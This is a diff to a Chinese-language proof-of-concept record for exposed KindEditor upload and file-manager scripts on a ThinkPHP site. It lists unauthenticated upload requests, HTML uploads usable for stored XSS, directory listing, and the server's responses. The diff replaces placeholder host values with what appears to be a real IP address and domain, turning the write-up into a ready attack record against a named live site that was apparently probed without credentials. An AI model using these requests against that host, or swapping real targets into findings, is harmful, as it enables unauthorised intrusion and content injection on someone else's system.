@@ -7,11 +7,11 @@
 - **severity**: high
 - **source**: self
 - **verified**: 1
-- **verified_note**: 2026-10-29 在 192.0.2.2 零 Cookie 实测：① GET /Public/main/js/kindeditor/php/file_manager_json.php → 200/1650B JSON，current_url=/Upload/、total_count=12（含 List、qrcode、vlive 等业务目录）；② POST upload_json.php?dir=image（multipart imgFile=probe604.jpg）→ 200/91B {"error":0,"url":"http://target480.example.com/Upload/image/20261029/20261029025332_69694.jpg"}；③ GET 该 jpg → 200/12B image/jpeg 正文 MARKER604IMG；④ dir=file 上传 m604.html → 回读 200 text/html 正文 MARKER604HTML；⑤ 阴性对照：filename=*.php/.phtml/.php5/.pht/.PHP/.jpg.php → {"error":1,"message":"上传文件扩展名是不允许的扩展名。只允许gif,jpg,jpeg,png,bmp格式。"}；dir=../../App/Tpl/Home → "目录名不正确。"；file_manager path=../../../ → "Access is not allowed."；.jpg 内存放 PHP 后经 /Upload/...jpg/x.php 访问 → 404（该目录不解析 PHP）。
+- **verified_note**: 2026-10-29 在 45.151.135.166 零 Cookie 实测：① GET /Public/main/js/kindeditor/php/file_manager_json.php → 200/1650B JSON，current_url=/Upload/、total_count=12（含 List、qrcode、vlive 等业务目录）；② POST upload_json.php?dir=image（multipart imgFile=probe604.jpg）→ 200/91B {"error":0,"url":"http://kjadmin.com/Upload/image/20261029/20261029025332_69694.jpg"}；③ GET 该 jpg → 200/12B image/jpeg 正文 MARKER604IMG；④ dir=file 上传 m604.html → 回读 200 text/html 正文 MARKER604HTML；⑤ 阴性对照：filename=*.php/.phtml/.php5/.pht/.PHP/.jpg.php → {"error":1,"message":"上传文件扩展名是不允许的扩展名。只允许gif,jpg,jpeg,png,bmp格式。"}；dir=../../App/Tpl/Home → "目录名不正确。"；file_manager path=../../../ → "Access is not allowed."；.jpg 内存放 PHP 后经 /Upload/...jpg/x.php 访问 → 404（该目录不解析 PHP）。
 - **path**: pocs/thinkphp-站群-kindeditor-php-版本-upload_json.php-file_manager/poc.txt
 - **tags**: kindeditor,thinkphp,未授权上传,存储型xss,文件管理
 - **created_at**: 2026-10-28T18:59:25.294Z
-- **engine**: 192.0.2.2 (https://192.0.2.2)
+- **engine**: 45.151.135.166 (https://45.151.135.166)
 
 ## 描述
 
@@ -35,15 +35,15 @@ KindEditor 原始 PHP 示例脚本直接暴露在生产站 /Public/main/js/kinde
 - `POST /Public/main/js/kindeditor/php/upload_json.php?dir=image|file`
 - `GET  /Public/main/js/kindeditor/php/file_manager_json.php`
 - 无任何 Cookie/Token 校验；上传落点 `/Upload/<dir>/YYYYMMDD/<时间戳>_<随机>.ext`
-- 上传回显里的 host 泄露站点配置域名（本例 `target480.example.com`）
+- 上传回显里的 host 泄露站点配置域名（本例 `kjadmin.com`）
 
 ## 实测回显
 ```
 POST ...?dir=image  multipart imgFile=@probe604.jpg;type=image/jpeg
-→ 200/91B {"error":0,"url":"http://target480.example.com/Upload/image/20261029/20261029025332_69694.jpg"}
+→ 200/91B {"error":0,"url":"http://kjadmin.com/Upload/image/20261029/20261029025332_69694.jpg"}
 GET  /Upload/image/20261029/20261029025332_69694.jpg → 200 image/jpeg 正文 MARKER604IMG
 POST ...?dir=file   multipart imgFile=@m604.html;type=text/html
-→ {"error":0,"url":"http://target480.example.com/Upload/file/20261029/20261029025444_25468.html"} → 回读 200 text/html
+→ {"error":0,"url":"http://kjadmin.com/Upload/file/20261029/20261029025444_25468.html"} → 回读 200 text/html
 GET  file_manager_json.php → {"current_url":"/Upload/","total_count":12,"file_list":[{"filename":"List"},{"filename":"qrcode"},{"filename":"vlive"}...]}
 ```
 
